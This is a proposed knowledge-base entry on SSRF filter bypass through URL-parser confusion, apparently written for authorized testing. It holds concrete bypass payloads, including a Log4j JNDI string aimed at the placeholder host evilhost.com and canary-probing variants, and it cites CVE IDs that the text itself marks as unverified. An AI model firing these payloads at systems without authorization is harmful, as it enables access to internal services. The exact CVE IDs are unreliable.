# PROPOSAL (proposal) for docs/knowledge/class-ssrf.md — kb-enrich 2026-09-04
_Review and apply manually; not auto-merged into the KB._

## URL-parser-confusion payload taxonomy (added 2026-09-04)

Formalizes the "assume filter-bypassable, don't enumerate" note above into concrete test strings.
Same confirm primitive (OOB canary callback = proof); this only widens which payload shape gets a
hardened-looking validator to still let the actual fetch through.

### Five confusion classes (Claroty Team82, cross-language study of 16 parsers)
1. **Scheme confusion** — missing/malformed scheme (`google.com/abc` — validator finds no netloc
   and passes; curl/urllib3 silently default to `http://` and fetch anyway).
2. **Slash confusion** — irregular slash count (`http:///google.com`, `http:/google.com`,
   `http://target.com/////evil.com`) — some parsers see "path on a hostless URL", others
   (curl, browser fetch) normalize and follow it. Real CVE instance: Ruby `Clearance` gem stored
   the multi-slash path, then re-parsed it down to `///evil.com`, resolved by the browser as a
   network-path reference to `evil.com`.
3. **Backslash confusion** — `http:\\google.com` / `https:/\google.com`. Chrome and several
   fetchers treat `\` as `/`; validators using strict RFC3986 splitting often don't.
4. **URL-encoded-data confusion** — percent-encoding inside the host/authority component that one
   parser decodes before validating and another decodes only at fetch time.
5. **Scheme mixup** — parsing a URL of one scheme with a parser built for a different scheme (the
   Log4j JNDI case below).

### Canonical fragment-truncation example (Log4j `allowedLdapHost`)
`${jndi:ldap://127.0.0.1#.evilhost.com:1389/a}` — the validating URI class extracts authority up to
the `#` fragment marker (sees `127.0.0.1`, passes the allowlist check); the actual LDAP connector
resolves the full string and connects to `evilhost.com`. Same shape applies to any allowlist check
that uses a different URL-authority boundary than the code that actually issues the request.

### Homoglyph / userinfo-@ tricks
`http://127.0.0.1\@allowed.com/` and `http://allowed.com⁄@127.0.0.1/` (U+2044 FRACTION SLASH,
visually near-identical to `/`) — exploit validators that split host from userinfo on the wrong
character or fail to canonicalize lookalike Unicode before the `@`.

### ⚠️ fast-uri (Node.js) bracketed-IPv6 truncation — verify CVE ID before citing
Multiple 2026 CVE reports (IDs seen: CVE-2026-75899/75975/76172/75931/16221 — sourced from
cvereports.com/dailycve.com/Snyk advisory, NOT a single authoritative vendor advisory; reconcile
against NVD/GHSA before using an exact ID in a report) describe fast-uri failing to enforce strict
IPv6-bracket-literal grammar — a malformed bracketed literal is silently truncated into a valid
loopback/private address. Relevant on any Node/JS-stack in-scope host using `ajv` or JSON-schema
URL-format validation upstream of a fetch. Mechanism is corroborated across sources even pending ID
reconciliation.

### Detection for our unauth-safe SSRF lane
Not a new confirm primitive — still OOB-canary-callback-only. What's new: when probing a sink that
appears to validate/reject the host, retry with these shapes pointed at our interactsh canary before
concluding "hardened, drop it":
- `http:\\<canary>` / `https:/\<canary>`
- `http:///<canary>` / `http://target/////<canary>` (if the sink echoes/redirects a path)
- `http://<canary>#.decoy.example` (fragment-truncation shape)
- `http://<canary>\@decoy.example/` and the reverse ownership order
A callback on any of these = the fetcher normalized past whatever validation blocked the naive
payload — same interactsh-callback confirm discipline as always, just don't stop at one payload
shape on a sink that looks protected.

### Sources
- claroty.com/team82/research/exploiting-url-parsing-confusion
- snyk.io/blog/url-confusion-vulnerabilities
- security.snyk.io/vuln/SNYK-JS-FASTURI-18021349
- github.com/whatwg/url/issues/893 (Malformed URL Normalization in Standard Introduces SSRF Risks)
